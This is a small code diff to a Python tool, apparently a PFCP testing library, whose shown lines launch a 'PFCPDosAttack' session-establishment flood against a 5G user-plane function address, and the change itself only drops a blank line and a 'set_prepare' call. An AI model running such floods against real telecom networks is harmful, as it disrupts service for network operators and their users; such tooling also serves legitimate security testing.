@@ -23,6 +23,7 @@ class Ez_PFCP:
         self.verbose = verbose
         self.seid=None
         
+        
         if verbose:
             print("[EZ-PFCP] Verbose mode enabled")
         
@@ -387,6 +388,6 @@ class PFCPDosAttack:
 objet_dos = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
 objet_dos.set_verbose(True)
 objet_dos.set_randomize(True)
-objet_dos.set_prepare(True)
+
 objet_dos.set_random_far_number(int(sys.argv[3]))
 objet_dos.Start_pfcp_session_establishment_flood(reqNbr=int(sys.argv[1]), num_threads=int(sys.argv[2]))
